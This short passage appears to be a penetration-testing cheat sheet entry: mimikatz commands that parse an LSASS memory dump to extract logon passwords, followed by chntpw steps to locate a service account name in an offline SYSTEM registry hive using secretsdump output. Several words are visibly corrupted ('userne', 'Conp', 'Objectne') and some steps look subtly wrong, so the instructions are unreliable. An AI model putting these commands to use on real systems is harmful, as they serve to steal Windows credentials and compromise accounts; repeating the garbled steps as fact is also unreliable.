```powershell
mimikatz.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords full
```

If there are any errors where a cleartext password is recovered without the associated userne, it is likely that you compromised a service account and mimikatz was not able to parse the result. Run the following:

```powershell
chntpw -i SYSTEMHIVE
9
cd Conp
cd Services
find service ne from secretsdump output - usually starts with _SC_
cd <service ne minus the “_SC_”>
cat Objectne
```